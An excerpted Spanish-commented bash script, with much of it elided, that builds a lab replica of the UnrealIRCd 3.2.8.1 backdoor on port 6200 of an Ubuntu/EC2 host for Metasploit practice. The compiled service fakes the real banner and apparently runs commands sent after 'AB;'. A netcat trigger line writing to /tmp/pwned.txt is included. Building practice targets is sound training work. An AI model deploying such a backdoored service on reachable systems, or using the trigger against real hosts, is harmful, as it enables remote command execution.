...
# Reemplazo drop-in del 3.2.8.1: mismo puerto 6200, mismo flujo con Metasploit.
# Autor: Antonio-ready | Probado en Ubuntu 22.04/24.04 (EC2/VM)
# =============================================================================
set -euo pipefail
...
BANNER_VERSION="UnrealIRCd-3.2.8.1"   # banner para MSF/Nmap (solo decorativo)
RUN_USER="ircd"
...
apt-get install -y build-essential gcc make net-tools curl >>"$LOG_FILE" 2>&1
...
int main(int argc, char **argv){
  ...
  // args simples: --port N --hostname X --banner-version Y
    ...
    if(pid==0){
      ...
      while((n = recv(c, buf, sizeof(buf)-1, 0)) > 0){
        ...
        if(n>=3 && buf[0]=='A' && buf[1]=='B' && buf[2]==';'){
          ...
          // Respuesta IRC mínima para aparentar servicio real
...
sleep 2
systemctl --no-pager --full status "${SERVICE_NAME}" | sed -n '1,15p' >>"$LOG_FILE" 2>&1
...
# IP pública (EC2 metadata -> fallback)
...
cat > /home/ubuntu/LAB_INFO.txt <<EOF
========================================
...
Servicio: ${SERVICE_NAME} (usuario: ${RUN_USER})
...
TEST MANUAL (sin MSF):
  echo "AB; id > /tmp/pwned.txt" | nc ${PUBLIC_IP} ${PORT}
  # Luego: cat /tmp/pwned.txt
